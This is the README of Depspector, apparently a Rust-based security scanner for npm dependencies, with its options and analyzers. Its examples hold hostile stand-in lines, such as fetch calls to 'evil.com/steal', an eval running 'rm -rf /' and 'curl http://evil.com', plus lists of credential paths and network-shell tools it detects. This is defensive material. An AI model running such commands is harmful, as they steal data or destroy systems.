# Depspector

<p align="center">
  <img src="logo.png" alt="Depspector Logo" width="800"/>
</p>

**Depspector** is an advanced post-install security analysis tool for npm dependencies. It goes beyond simple CVE checks by performing deep static analysis and behavioral heuristic detection on your `node_modules`.

Built with **Rust** for maximum performance and compiled to native Node.js bindings using [napi-rs](https://napi.rs/).

## Features

- **🕵️ Deep Static Analysis**: Detects suspicious code patterns across 20 specialized analyzers:
  - **Environment Variables**: Monitors `process.env` access with configurable whitelisting
  - **Network Activity**: Detects network requests (`fetch`, `http`, `axios`) with host whitelisting
  - **Dynamic Code Execution**: Flags `eval()`, `new Function()`, and `vm.runInContext()` usage
  - **File System Access**: Detects access to 60+ sensitive paths (credentials, SSH keys, system files, etc.)
  - **Obfuscation Detection**: Identifies suspiciously long strings (configurable threshold)
  - **Buffer Encoding**: Flags suspicious `Buffer.from()` usage that may decode payloads
  - **Process Spawning**: Detects child process execution and low-level spawn calls
  - **Secrets Detection**: Identifies hardcoded credentials (AWS keys, private keys, API tokens)
  - **System Metadata**: Flags collection of system information (`os.userInfo()`, network interfaces)
  - **Prototype Pollution**: Detects attempts to pollute object prototypes
  - **Minified Code**: Identifies minified or obfuscated code patterns
  - **IP Addresses**: Detects hardcoded public IP addresses
  - **Base64 Blobs**: Flags large Base64 strings that may contain hidden payloads
- **🛡️ Supply Chain Security**:
  - **CVE Detection**: Checks packages against OSV (Open Source Vulnerabilities) database for known CVEs
  - **Typosquatting Detection**: Identifies packages with names similar to popular libraries
  - **Cooldown Period**: Flags newly published packages (configurable, default <72h)
  - **Dormant Package Detection**: Alerts on packages updated after long inactivity (configurable, default >1 year)
  - **Reputation Analysis**: Checks maintainer count, provenance, and publisher trustworthiness
  - **Lifecycle Scripts**: Flags suspicious install/postinstall scripts
  - **Native Code**: Alerts on packages with native bindings that can execute arbitrary code
- **📦 Comprehensive Scanning**:
  - Automatic transitive dependency scanning
  - Parallel analysis for performance
  - Smart package caching to avoid re-analyzing unchanged packages
- **⚙️ Highly Configurable**:
  - Fine-tune each analyzer via `.depspectorrc` configuration file
  - Whitelist trusted domains, environment variables, and users
  - Customize detection thresholds (string lengths, time periods, etc.)
  - Enable/disable individual analyzers
  - Configure severity levels and fail-fast behavior
- **🔍 Advanced Features**:
  - Incremental scanning with `--only-new` flag
  - Cache management for faster subsequent scans
  - Detailed reporting with severity levels (critical/high/medium/low)
  - CI/CD friendly with configurable exit codes

## Installation

NPM

```bash
npm install -g depspector
# OR
npm install --save-dev depspector
```

YARN

```bash
yarn add --dev depspector
```

## Usage

Run Depspector in your project root:

```bash
npx depspector
```

### Examples

```bash
# Run with verbose output
npx depspector --verbose

# Clear cache before scanning
npx depspector --clear-cache

# Show only new issues
npx depspector --only-new

# Fail fast on first high severity issue
npx depspector --fail-fast

# Run in offline mode (skip network-dependent analyzers)
npx depspector --offline

# Analyze a different project directory
npx depspector --cwd /path/to/project

# Show detailed benchmark/timing information
npx depspector --benchmark
```

### Development Usage

If you're developing depspector, use these commands:

```bash
# Build the native binary (release)
npm run build

# Build the native binary (debug, faster compilation)
npm run build:debug

# Run Rust tests
npm run cargo:test

# Run locally
node bin.js [options]
```

### Options

- `-p, --path <path>`: Path to `node_modules` (default: `./node_modules`).
- `--exclude-path <path...>`: Exclude specific file paths from analysis (can be specified multiple times).
- `-c, --config <path>`: Path to configuration file (default: `.depspectorrc`).
- `--cwd <path>`: Working directory where to run the analysis (default: `.`).
- `--verbose`: Show detailed progress.
- `--no-cache`: Disable package result caching (forces fresh analysis even if unchanged).
- `--no-color`: Disable colored terminal output. Useful for piping to files or CI systems that don't support ANSI colors.
- `--clear-cache`: Clear stored cache entries before scanning (use to force full regeneration while keeping caching enabled afterward).
- `--fail-fast`: Stop analysis immediately when the first issue at or above the configured `exitWithFailureOnLevel` is found (useful for CI/CD to fail quickly).
- `--only-new`: Show only new issues found in this scan, excluding issues from cached packages (useful for incremental analysis).
- `--offline`: Disable analyzers that require network access (CVE, cooldown, dormant, reputation, deprecated). Useful for environments without internet access or to speed up scans.
- `-a, --analyzer <name...>`: Run only specific analyzers (can be specified multiple times). Overrides config file settings. Example: `--analyzer cve --analyzer deprecated`.
- `--ignore-issue <id...>`: Ignore specific issues by their ID (can be specified multiple times). Issue IDs are displayed in brackets after each finding.
- `--concurrency <n>`: Maximum number of concurrent package analyses (defaults to number of CPU cores).
- `--json <path>`: Output the analysis report as JSON to the specified file.
- `--yaml <path>`: Output the analysis report as YAML to the specified file.
- `--csv <path>`: Output the analysis report as CSV to the specified file. Each row contains: package, file, line, severity, type, message, code, id.
- `--report-level <level>`: Minimum severity level to report (`critical`, `high`, `medium`, `low`). Overrides the config file setting.
- `--benchmark`: Show detailed timing information for each analyzer and phase. Useful for performance profiling and identifying slow analyzers.
- `--include-tests`: Include test files in analysis. By default, test files are skipped (e.g., `*.test.js`, `*.spec.ts`, `jest.config.js`).
- `--include-dev-deps`: Include dev dependencies in analysis. By default, dev dependencies are excluded to focus on production security.
- `--skip-transient`: Skip transient dependencies and only scan packages listed directly in your root `package.json` (both `dependencies` and `devDependencies` if `--include-dev-deps` is set).
- `--exclude-sources`: Exclude local source files and workspace packages from analysis. By default, depspector scans both your project's source files and any workspace packages alongside node_modules dependencies.
- `--exclude-deps`: Exclude node_modules dependencies from analysis. Use with source scanning to analyze only your project's own code.

## Performance

Depspector includes several optimizations for faster scanning:

- **Native Performance**: Written in Rust and compiled to native code for maximum speed.
- **Package Caching**: Caches both the fact a package was scanned and its findings. If a package's `package.json` is unchanged, its previous results are reused in the report (not silently dropped) and the code is not re-parsed.
- **Parallel Analysis**: Package-level analyzers and file-level analyzers run in parallel to maximize performance.
- **Configurable Cache Directory**: Use `cacheDir` in configuration to control where cache files are stored (useful for CI environments).
- **Cache Freshness Control**: Configure maximum cache lifetime with `cacheMaxAgeSeconds` to automatically skip stale entries.

The first scan may be slow as it goes through all package dependencies.

To force a fresh scan of everything, either clear the cache directory or point `cacheDir` to a clean temporary location before running.

You can also use the CLI flags:

- `--clear-cache` to wipe existing cached entries before the scan starts.
- `--no-cache` to skip both reading and writing cache data for that run.
- `--only-new` to show only issues from packages analyzed fresh in this run (cached packages are still listed but their issues are marked as cached).

## Configuration

Create a `.depspectorrc` file in your project root:

```json
{
  "analyzers": {
    "network": {
      "allowedHosts": ["google.com", "api.stripe.com"]
    },
    "reputation": {
      "whitelistedUsers": ["github-actions[bot]", "renovate[bot]"]
    },
    "env": {
      "enabled": false,
      "allowedEnvVars": ["NODE_ENV", "CI"]
    },
    "fs": {
      "enabled": true,
      "severity": "medium"
    },
    "minified": {
      "severity": "low"
    }
  },
  "exclude": ["internal-package"],
  "ignoreIssues": ["MYPACKAG-NETWORK-A1B2C3", "OTHERPACK-SECRETS-9F8E7D"],
  "exitWithFailureOnLevel": "high",
  "reportLevel": "medium"
}
```

### Configuration Options

| Option                   | Type                                                 | Default         | Description                                                                                                                  |
| ------------------------ | ---------------------------------------------------- | --------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| `analyzers`              | Object                                               | All enabled     | Configure individual analyzers (see [Analyzers](#analyzers) table).                                                          |
| `exclude`                | Array\<string\>                                      | `[]`            | Package names to exclude from scanning.                                                                                      |
| `excludePaths`           | Array\<string\>                                      | `[]`            | File paths (relative to package root) to exclude from analysis.                                                              |
| `ignoreIssues`           | Array\<string\>                                      | `[]`            | Issue IDs to ignore. Issue IDs are displayed in brackets after each finding in the report.                                   |
| `exitWithFailureOnLevel` | `"critical" \| "high" \| "medium" \| "low" \| "off"` | `"high"`        | Exit with code 1 if issues at this severity level or higher are found. Use `"off"` to disable.                               |
| `reportLevel`            | `"critical" \| "high" \| "medium" \| "low"`          | `"medium"`      | Only report issues at this severity level or higher. If not set, all issues are reported.                                    |
| `failFast`               | boolean                                              | `false`         | Stop analysis immediately when first issue at or above `exitWithFailureOnLevel` is found.                                    |
| `includeTests`           | boolean                                              | `false`         | Include test files in analysis. By default, test files are skipped (see patterns below).                                     |
| `includeDevDeps`         | boolean                                              | `false`         | Include dev dependencies in analysis. By default, dev-only packages are excluded to focus on production security.            |
| `includeOptionalDeps`    | boolean                                              | `false`         | Include optional dependencies in analysis. By default, optional packages are excluded.                                       |
| `skipTransient`          | boolean                                              | `false`         | Skip transient dependencies and only scan packages listed in root `package.json`.                                            |
| `cacheDir`               | string                                               | System temp dir | Directory to cache analysis results. Defaults to OS temp directory.                                                          |
| `cacheMaxAgeSeconds`     | number                                               | `null`          | Max age for a cache entry in seconds. If set, entries older than this are ignored and re-analyzed.                           |
| `maxFileSize`            | number                                               | `5242880`       | Maximum file size in bytes for AST-based analyzers. Larger files are skipped. Default 5MB.                                   |
| `astTimeoutMs`           | number                                               | `0`             | Timeout in milliseconds for AST parsing per file. 0 means no timeout. Useful for skipping files that take too long to parse. |
| `npm`                    | Object                                               | `{}`            | NPM registry configuration (see below).                                                                                      |

**Dependency Filtering:**

By default, Depspector excludes dev and optional dependencies to focus on production security. This behavior can be customized:

- **Dev dependencies**: Packages that are only reachable through `devDependencies` in the dependency tree are excluded. Use `includeDevDeps: true` or `--include-dev-deps` to include them.
- **Optional dependencies**: Packages that are only reachable through `optionalDependencies` in the dependency tree are excluded. Use `includeOptionalDeps: true` or `--include-optional-deps` to include them.
- **Transient dependencies**: Packages that are not directly listed in your root `package.json` (they're dependencies of your dependencies). Use `skipTransient: true` or `--skip-transient` to exclude them and only scan direct dependencies.

**Example combinations:**

```bash
# Scan only production dependencies (default)
npx depspector

# Scan production + dev dependencies
npx depspector --include-dev-deps

# Scan production + optional dependencies
npx depspector --include-optional-deps

# Scan only direct dependencies (no transient)
npx depspector --skip-transient

# Scan only direct production + dev dependencies
npx depspector --include-dev-deps --skip-transient
```

**Test File Patterns (skipped by default):**

The following patterns are recognized as test files and excluded unless `includeTests` is enabled:

- Suffixes: `*.test.js`, `*.spec.ts`, `*.tests.js`, `*.specs.ts`, `*_test.js`, `*-spec.ts` (and variants for `.mjs`, `.cjs`)
- Config files: `jest.config.js`, `jest.setup.ts`, `vitest.config.js`, `karma.conf.js`, `mocha.opts`
- Helper files: `test.js`, `spec.js`, `test-helper.js`, `test-utils.js`, `setup-tests.js`

### NPM Registry Configuration

The `npm` object allows you to configure custom npm registries and authentication:

```json
{
  "npm": {
    "registry": "https://registry.npmjs.org",
    "token": "your-npm-token"
  }
}
```

Or with basic authentication:

```json
{
  "npm": {
    "registry": "https://custom-registry.example.com",
    "username": "your-username",
    "password": "your-password"
  }
}
```

| Property   | Type   | Description                                              |
| ---------- | ------ | -------------------------------------------------------- |
| `registry` | string | NPM registry URL (default: `https://registry.npmjs.org`) |
| `token`    | string | NPM authentication token (Bearer token)                  |
| `username` | string | Username for basic authentication                        |
| `password` | string | Password for basic authentication                        |

## AI Verification (Experimental)

Depspector can use AI (OpenAI or Google Gemini) to automatically verify reported issues and filter out false positives. This significantly reduces noise by analyzing the code context around each finding.

### Configuration

Add the `ai` section to your `.depspectorrc`:

```json
{
  "ai": {
    "enabled": true,
    "provider": "openai",
    "apiKey": "your-api-key",
    "model": "gpt-4o-mini", // Optional, defaults to gpt-4o-mini
    "threshold": "high", // Only verify High and Critical issues
    "endpoint": "https://your-custom-openai-instance/v1/chat/completions", // Optional, for self-hosted LLMs
    "maxIssues": 10 // Optional, limit the number of issues verified (prioritizing critical)
  }
}
```

| Property    | Type   | Default    | Description                                                                 |
| ----------- | ------ | ---------- | --------------------------------------------------------------------------- |
| `enabled`   | bool   | `false`    | Enable AI verification.                                                     |
| `provider`  | string | `"openai"` | AI provider: `"openai"` or `"gemini"`.                                      |
| `apiKey`    | string | `null`     | API key. Can also be set via `OPENAI_API_KEY` or `GEMINI_API_KEY` env vars. |
| `model`     | string | (auto)     | Model to use (e.g., `gpt-4o-mini`, `gemini-1.5-flash`).                     |
| `threshold` | string | `"high"`   | Minimum severity to verify. Low severity issues are skipped to save tokens. |
| `endpoint`  | string | (auto)     | Custom endpoint for OpenAI or Gemini.                                       |
| `maxIssues` | number | `10`       | Maximum number of issues to verify.                                         |

> [!CAUTION]
> **Privacy Warning**: When AI verification is enabled, snippets of your code (including the flagged lines and surrounding context) are sent to the configured third-party AI provider. Do not enable this on codebases with strict data egress policies without review.

## Post-Install Hook

To automatically scan dependencies after every install, add this to your `package.json`:

```json
{
  "scripts": {
    "postinstall": "depspector"
  }
}
```

## Ignoring Specific Issues

Sometimes you may want to ignore specific issues that are false positives or accepted risks. Each issue detected by Depspector has a unique ID displayed in the report output.

### Finding Issue IDs

When you run a scan, issue IDs are shown in gray brackets after each finding:

```
[MEDIUM] Suspicious network request detected (Line 42) [ID: MYPACKAG-NETWORK-A1B2C3]
```

### Ignoring via Configuration

Add issue IDs to your `.depspectorrc` file:

```json
{
  "ignoreIssues": ["MYPACKAG-NETWORK-A1B2C3", "OTHERPACK-SECRETS-9F8E7D"]
}
```

### Ignoring via CLI

You can also ignore issues temporarily using the `--ignore-issue` flag:

```bash
# Ignore a single issue
npx depspector --ignore-issue MYPACKAG-NETWORK-A1B2C3

# Ignore multiple issues
npx depspector --ignore-issue MYPACKAG-NETWORK-A1B2C3 --ignore-issue OTHERPACK-SECRETS-9F8E7D
```

The CLI flag can be combined with configuration file settings. Both will be merged together.

If you pass ignored issue IDs that do not match any findings, Depspector will print a note listing those IDs so you can clean up stale ignores.

## Analyzers

### Common Analyzer Options

All analyzers support the following common configuration options:

| Property   | Type                                        | Default     | Description                                                                                     |
| ---------- | ------------------------------------------- | ----------- | ----------------------------------------------------------------------------------------------- |
| `enabled`  | boolean                                     | `true`      | Enable or disable the analyzer.                                                                 |
| `severity` | `"critical" \| "high" \| "medium" \| "low"` | (per-issue) | Override severity for all issues from this analyzer. If not set, each issue uses its own level. |

Example:

```json
{
  "analyzers": {
    "minified": {
      "enabled": true,
      "severity": "low"
    },
    "secrets": {
      "severity": "critical"
    }
  }
}
```

### Analyzer Reference

| Analyzer      | Description                                                                                                               |
| ------------- | ------------------------------------------------------------------------------------------------------------------------- |
| `cve`         | Checks packages against OSV.dev database for known CVEs and security advisories. Configurable timeout.                    |
| `deprecated`  | Detects packages marked as deprecated in the npm registry.                                                                |
| `env`         | Detects access to environment variables (`process.env`). Supports `allowedEnvVars` whitelist with sensible defaults.      |
| `network`     | Detects network requests. Supports `allowedHosts` whitelist with sensible defaults.                                       |
| `eval`        | Flags `eval()`, `new Function()`, and `setTimeout/setInterval` with strings. Severity based on content.                   |
| `obfuscation` | Detects suspiciously long strings (potential obfuscation). Configurable `minStringLength`.                                |
| `fs`          | Detects access to sensitive paths. Supports `additionalDangerousPaths`.                                                   |
| `typosquat`   | Identifies packages with names similar to popular libraries.                                                              |
| `cooldown`    | Flags newly published packages. Configurable `hoursSincePublish`.                                                         |
| `dormant`     | Alerts on packages updated after long inactivity. Configurable `daysSincePreviousPublish`.                                |
| `dynamic`     | Detects `vm.runInContext()` and dynamic require patterns.                                                                 |
| `buffer`      | Flags suspicious `Buffer.from()` usage. Configurable `minBufferLength`.                                                   |
| `reputation`  | Checks maintainer count and publisher trustworthiness. Supports `whitelistedUsers`.                                       |
| `scripts`     | Flags suspicious lifecycle scripts (install, postinstall, preinstall). Supports `allowedCommands` with sensible defaults. |
| `process`     | Detects child process spawning and low-level spawn calls. Uses data flow analysis to resolve variables.                   |
| `native`      | Alerts on packages with native bindings.                                                                                  |
| `secrets`     | Identifies hardcoded credentials (AWS keys, private keys, API tokens).                                                    |
| `metadata`    | Flags collection of system information (`os.userInfo()`, network interfaces).                                             |
| `pollution`   | Detects prototype pollution attempts.                                                                                     |
| `minified`    | Identifies minified or obfuscated code.                                                                                   |
| `ip`          | Detects hardcoded public IP addresses. Ignores private ranges.                                                            |
| `base64`      | Flags large Base64 blobs. Configurable `minBufferLength`.                                                                 |
| `license`     | Detects packages using restrictive or problematic licenses. Supports `allowedLicenses` whitelist.                         |

### CVE Analyzer Configuration

The `cve` analyzer queries the [OSV.dev](https://osv.dev) database for known vulnerabilities affecting your dependencies. It maps CVE severity scores to Depspector's severity levels.

**CVSS Score Thresholds:**

- **Critical**: CVSS score ≥ 9.0
- **High**: CVSS score ≥ 7.0
- **Medium**: CVSS score ≥ 4.0
- **Low**: CVSS score < 4.0

```json
{
  "analyzers": {
    "cve": {
      "enabled": true
    }
  }
}
```

**Note**: CVE scanning requires network access to `api.osv.dev`. Queries are made per package version and failures are silently ignored to avoid blocking analysis on network issues.

### Env Analyzer Configuration

The `env` analyzer detects access to environment variables (`process.env`). By default, common Node.js environment variables are whitelisted to reduce noise:

**Default Allowed Variables:**
`NODE_ENV`, `DEBUG`, `PORT`, `HOST`, `HOSTNAME`, `PATH`, `HOME`, `USER`, `SHELL`, `LANG`, `LC_ALL`, `TZ`, `CI`, `npm_package_name`, `npm_package_version`, `npm_lifecycle_event`, `NODE_DEBUG`, `NODE_OPTIONS`, `NODE_PATH`, `UV_THREADPOOL_SIZE`, `NODE_EXTRA_CA_CERTS`, `NODE_TLS_REJECT_UNAUTHORIZED`, `NO_COLOR`, `FORCE_COLOR`, `TERM`, `COLORTERM`, `PWD`, `OLDPWD`, `TMPDIR`, `TEMP`, `TMP`

You can override the defaults with your own whitelist:

```json
{
  "analyzers": {
    "env": {
      "allowedEnvVars": ["NODE_ENV", "CI", "MY_CUSTOM_VAR"]
    }
  }
}
```

| Property         | Type     | Default                   | Description                                    |
| ---------------- | -------- | ------------------------- | ---------------------------------------------- |
| `allowedEnvVars` | string[] | (common Node.js env vars) | Environment variables to ignore when accessed. |

Any access to `process.env.<VAR>` where `<VAR>` is in `allowedEnvVars` will be ignored. Bare `process.env` access and non-whitelisted variables will still be reported.

### Network Analyzer Configuration

The `network` analyzer detects network requests (`fetch`, `axios`, `http.get`, `WebSocket`, etc.). By default, common safe hosts are whitelisted to reduce noise from legitimate package behavior:

**Default Allowed Hosts:**
`localhost`, `127.0.0.1`, `::1`, `0.0.0.0`, `registry.npmjs.org`, `registry.yarnpkg.com`, `npm.pkg.github.com`, `github.com`, `raw.githubusercontent.com`, `api.github.com`, `gitlab.com`, `bitbucket.org`, `npmjs.com`, `unpkg.com`, `cdn.jsdelivr.net`, `esm.sh`, `deno.land`

You can override the defaults with your own whitelist:

```json
{
  "analyzers": {
    "network": {
      "allowedHosts": ["api.mycompany.com", "internal.service.local"]
    }
  }
}
```

| Property       | Type     | Default             | Description                                     |
| -------------- | -------- | ------------------- | ----------------------------------------------- |
| `allowedHosts` | string[] | (common safe hosts) | Hosts to ignore when network requests are made. |

**Data Flow Analysis:**
The analyzer uses data flow analysis to resolve URLs stored in variables, template literals, and string concatenation:

```javascript
// Direct URL - detected
fetch("http://evil.com/steal");

// Variable - resolved via data flow analysis
const url = "http://evil.com/steal";
fetch(url); // Detected

// Template literal - resolved
const host = "evil.com";
fetch(`http://${host}/steal`); // Detected
```

**Note**: The analyzer only flags actual network function calls (like `fetch()`, `axios.get()`, `http.request()`). URL strings in configuration objects or templates are not flagged.

### Fs Analyzer Configuration

The `fs` analyzer detects suspicious file system access. By default, it checks for sensitive paths like `/etc/passwd`, `.ssh`, `.npmrc`, `/proc/self/environ`, and lock files. The analyzer uses **data flow analysis** to resolve paths stored in variables, template literals, string concatenation, and object properties.

**Data Flow Examples:**

```javascript
// Direct path - detected
fs.readFileSync("/etc/passwd");

// Variable - resolved via data flow analysis
const path = "/etc/passwd";
fs.readFile(path); // Detected

// Template literal - resolved
const base = "/etc";
fs.readFile(`${base}/passwd`); // Detected

// String concatenation - resolved
fs.readFile("/etc" + "/passwd"); // Detected

// Object property - resolved
const config = { path: "/etc/passwd" };
fs.readFile(config.path); // Detected
```

You can add additional paths to monitor:

```json
{
  "analyzers": {
    "fs": {
      "additionalDangerousPaths": [".env", ".aws/credentials", "/etc/shadow"]
    }
  }
}
```

| Property                   | Type     | Default | Description                                                |
| -------------------------- | -------- | ------- | ---------------------------------------------------------- |
| `additionalDangerousPaths` | string[] | `[]`    | Additional file paths to flag as suspicious when accessed. |

The default dangerous paths include:

**Unix/Linux System Files:**

- `/etc/passwd`, `/etc/shadow`, `/etc/hosts`, `/etc/group`
- `/proc/self/environ`, `/proc/self/cmdline`, `/proc/self/cwd`

**SSH & Authentication:**

- `.ssh`, `id_rsa`, `id_ed25519`, `authorized_keys`, `known_hosts`

**NPM & Package Managers:**

- `.npmrc`, `.yarnrc`, `.npmrc.yaml`

**Environment & Secrets:**

- `.env`, `.env.local`, `.env.production`, `.env.development`

**Cloud Credentials:**

- `.aws/credentials`, `.aws/config`
- `.azure/credentials`
- `.config/gcloud`

**Git Credentials:**

- `.git/config`, `.git/credentials`, `.gitconfig`, `.git-credentials`

**Container & Orchestration:**

- `.docker/config.json`
- `.kube/config`, `kubeconfig`

**Database Credentials:**

- `.pgpass`, `.my.cnf`, `.redis/redis.conf`

**Lock Files:**

- `package-lock.json`, `yarn.lock`, `pnpm-lock.yaml`
- `composer.lock`, `Gemfile.lock`

**Private Keys & Certificates:**

- `.pem`, `.key`, `.p12`, `.pfx`, `.crt`, `.csr`
- `private_key`, `privatekey`

**Shell History:**

- `.bash_history`, `.zsh_history`, `.sh_history`

**Windows Specific:**

- `C:\Windows\System32\config\SAM`, `C:\Windows\System32\config\SYSTEM`
- `NTUSER.DAT`

### Obfuscation Analyzer Configuration

The `obfuscation` analyzer detects suspiciously long strings that may indicate obfuscated code. You can configure the minimum string length threshold:

```json
{
  "analyzers": {
    "obfuscation": {
      "minStringLength": 150
    }
  }
}
```

| Property          | Type   | Default | Description                                                              |
| ----------------- | ------ | ------- | ------------------------------------------------------------------------ |
| `minStringLength` | number | `200`   | Minimum length of a string (without spaces) to be flagged as suspicious. |

### Buffer Analyzer Configuration

The `buffer` analyzer detects suspicious `Buffer.from()` usage that may indicate payload decoding or obfuscated code execution. You can configure the minimum buffer string length:

```json
{
  "analyzers": {
    "buffer": {
      "minBufferLength": 100
    }
  }
}
```

| Property          | Type   | Default | Description                                                   |
| ----------------- | ------ | ------- | ------------------------------------------------------------- |
| `minBufferLength` | number | `100`   | Minimum length of buffer content to be flagged as suspicious. |

### Ip Analyzer Configuration

The `ip` analyzer detects hardcoded public IP addresses. It automatically ignores private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8) and other non-routable addresses.

You can also whitelist specific IP addresses:

```json
{
  "analyzers": {
    "ip": {
      "enabled": true,
      "allowedIps": ["8.8.8.8", "1.1.1.1"]
    }
  }
}
```

| Property     | Type     | Default | Description                     |
| ------------ | -------- | ------- | ------------------------------- |
| `allowedIps` | string[] | `[]`    | List of IP addresses to ignore. |

### Base64 Analyzer Configuration

The `base64` analyzer flags large Base64 strings that might conceal payloads. You can configure the minimum length:

```json
{
  "analyzers": {
    "base64": {
      "minBufferLength": 1000
    }
  }
}
```

| Property          | Type   | Default | Description                                    |
| ----------------- | ------ | ------- | ---------------------------------------------- |
| `minBufferLength` | number | `1000`  | Minimum length of Base64 string to be flagged. |

### Cooldown Analyzer Configuration

The `cooldown` analyzer flags recently published packages. You can configure the time threshold:

```json
{
  "analyzers": {
    "cooldown": {
      "hoursSincePublish": 48
    }
  }
}
```

| Property            | Type   | Default | Description                                                   |
| ------------------- | ------ | ------- | ------------------------------------------------------------- |
| `hoursSincePublish` | number | `72`    | Packages published within this many hours are flagged as new. |

### Dormant Analyzer Configuration

The `dormant` analyzer flags packages that were updated after a long period of inactivity. You can configure the dormancy threshold:

```json
{
  "analyzers": {
    "dormant": {
      "daysSincePreviousPublish": 180
    }
  }
}
```

| Property                   | Type   | Default | Description                                                                 |
| -------------------------- | ------ | ------- | --------------------------------------------------------------------------- |
| `daysSincePreviousPublish` | number | `365`   | Packages updated after this many days of inactivity are flagged as dormant. |

### Reputation Analyzer Configuration

The `reputation` analyzer can be configured to whitelist specific users (such as automated accounts) that should not trigger reputation issues:

```json
{
  "analyzers": {
    "reputation": {
      "whitelistedUsers": ["github-actions[bot]", "renovate[bot]"]
    }
  }
}
```

This is useful for allowing packages published by bots like GitHub Actions, Renovate, or Release Please to bypass reputation checks.

### Scripts Analyzer Configuration

The `scripts` analyzer flags suspicious lifecycle scripts (preinstall, install, postinstall). By default, common safe commands used by legitimate packages are whitelisted:

**Default Allowed Commands (partial list):**

- Package managers: `npm run`, `npm install`, `yarn run`, `pnpm run`, `lerna`, `nx`, `turbo`
- Git hooks: `husky`, `lint-staged`, `simple-git-hooks`, `lefthook`
- Build tools: `tsc`, `babel`, `webpack`, `rollup`, `esbuild`, `vite`, `parcel`, `swc`
- Native builds: `node-gyp`, `prebuild`, `prebuild-install`, `cmake-js`, `node-pre-gyp`
- Utilities: `patch-package`, `rimraf`, `shx`, `cross-env`, `copyfiles`, `ncp`, `cpy`

You can add additional allowed commands with your own list:

```json
{
  "analyzers": {
    "scripts": {
      "allowedCommands": ["my-build-tool", "custom-script"]
    }
  }
}
```

You can also whitelist specific script events entirely:

```json
{
  "analyzers": {
    "scripts": {
      "allowedScripts": ["postinstall"]
    }
  }
}
```

| Property          | Type     | Default                              | Description                                           |
| ----------------- | -------- | ------------------------------------ | ----------------------------------------------------- |
| `allowedCommands` | string[] | (common safe build/install commands) | Additional commands to ignore in lifecycle scripts.   |
| `allowedScripts`  | string[] | `[]`                                 | Script events to ignore entirely (e.g., postinstall). |

**Severity Classification:**
The scripts analyzer assigns severity based on script content:

- **Critical**: Scripts containing `curl`, `wget`, `bash -c`, `sh -c`, `eval`, `>`, or pipe commands with URLs
- **High**: Other potentially dangerous scripts
- **Medium**: Scripts with less risky operations

### Eval Analyzer Configuration

The `eval` analyzer detects dynamic code execution via `eval()`, `new Function()`, and `setTimeout/setInterval` with string arguments. Severity is determined by analyzing the content being evaluated.

**Severity Classification:**

- **Critical**: Content contains suspicious patterns:
  - URLs (`://`, `file://`, `data:`)
  - Code execution (`eval(`, `require(`, `exec(`, `spawn(`, `process.`, `child_process`, `fs.`, `Buffer.`)
  - Network operations (`fetch(`, `XMLHttpRequest`, `WebSocket`)
  - Obfuscation (`\x`, `\u00`, `fromCharCode`, `atob(`, `btoa(`)

- **Medium**: Safe/common patterns used by legitimate libraries:
  - `return this` (common pattern to get global object)
  - `return function`, `use strict`, `return arguments`
  - Short, simple content (< 50 characters without semicolons)

- **High**: Everything else (dynamic content that can't be resolved, longer code)

**Examples:**

```javascript
// Medium severity - common safe pattern
new Function("return this")();

// Critical severity - contains network URL
new Function("fetch('http://evil.com')")();

// Critical severity - contains code execution
eval("require('child_process').exec('rm -rf /')");

// Medium severity - simple content
eval("1 + 1");
```

### Process Analyzer Configuration

### License Analyzer Configuration

The `license` analyzer checks package licenses for compliance with your organization's policies. It identifies packages using restrictive licenses that require derivative works to be published under the same license (copyleft), as well as licenses requiring source attribution.

**Problematic License Categories:**

- **Restrictive (High Severity)**: Require derivative works to be open source
  - GPL (all versions): `GPL`, `GPL-2.0`, `GPL-3.0`, `GPL-3.0-or-later`
  - AGPL: `AGPL`, `AGPL-3.0`, `AGPL-3.0-or-later`
  - SSPL: Server Side Public License
  - EUPL: European Union Public License v1.2+

- **Moderate (Medium Severity)**: Require source code attribution
  - MPL: `MPL`, `MPL-2.0`
  - CDDL: Common Development and Distribution License
  - CPAL: Common Public Attribution License

**Allowed Licenses (No Issues):**

- MIT, Apache-2.0, BSD-2-Clause, BSD-3-Clause, ISC, and other permissive licenses

You can whitelist specific licenses that you've approved for use:

```json
{
  "analyzers": {
    "license": {
      "allowedLicenses": ["GPL-3.0", "custom-commercial-license"]
    }
  }
}
```

| Property          | Type     | Default | Description                                             |
| ----------------- | -------- | ------- | ------------------------------------------------------- |
| `allowedLicenses` | string[] | `[]`    | Licenses to allow despite being flagged as restrictive. |

**Example Output:**

```
HIGH [license] (ID: PKG-LICENSE-ABC123): Package uses GPL-3.0 license which requires
derivative works to be published under the same license.
  package.json:5
    "license": "GPL-3.0"
```

```javascript
// Direct call - detected
exec("curl http://evil.com");

// Variable - resolved via data flow analysis
const cmd = "curl http://evil.com";
exec(cmd); // Detected as critical (curl)

// Object property - resolved via data flow analysis
const config = { binary: "bash" };
spawn(config.binary); // Detected as critical (bash)
```

**Severity Classification:**
The process analyzer classifies severity based on the executed binary:

- **Critical**: `curl`, `wget`, `nc`, `netcat`, `bash`, `sh`, `zsh`, `fish`, `cmd`, `powershell`, `pwsh`, `python`, `perl`, `ruby`, `php`, `eval`
- **High**: `node`, `npm`, `npx`, `yarn`, `pnpm`, `bun`, `deno`, `git`, `make`, `cmake`, `cargo`, `go`, `rustc`, `gcc`, `g++`, `clang`, `javac`, `java`
- **Medium**: `cp`, `mv`, `rm`, `mkdir`, `rmdir`, `chmod`, `chown`, `cat`, `echo`, `ls`, `dir`, `find`, `grep`, `sed`, `awk`, `tar`, `gzip`, `zip`, `unzip`

Additionally, critical severity is assigned for:

- Commands containing URLs (`://`)
- Pipe chains (`|`)
- Shell injection patterns (`|bash`, `|sh`)
- `process.binding('spawn_sync')` calls

**Configuration Options:**

```json
{
  "analyzers": {
    "process": {
      "enabled": true,
      "allowed_commands": ["git", "node", "npm"]
    }
  }
}
```

- `allowed_commands`: Array of command names that are safe to execute and should not trigger issues. Commands are matched case-insensitively by their binary name (e.g., `/usr/bin/git` matches `"git"`).

## Supported Platforms

Depspector provides pre-built native binaries for the following platforms:

| Platform            | Architecture |
| ------------------- | ------------ |
| macOS               | x64, ARM64   |
| Linux (glibc)       | x64, ARM64   |
| Linux (musl/Alpine) | x64          |
| Windows             | x64          |

## Building from Source

If you need to build Depspector from source:

### Prerequisites

- [Rust](https://rustup.rs/) (latest stable)
- [Node.js](https://nodejs.org/) 18+
- npm

### Build Commands

```bash
# Clone the repository
git clone https://github.com/drodil/depspector.git
cd depspector

# Install dependencies
npm install

# Build native binary (release)
npm run build

# Build native binary (debug)
npm run build:debug

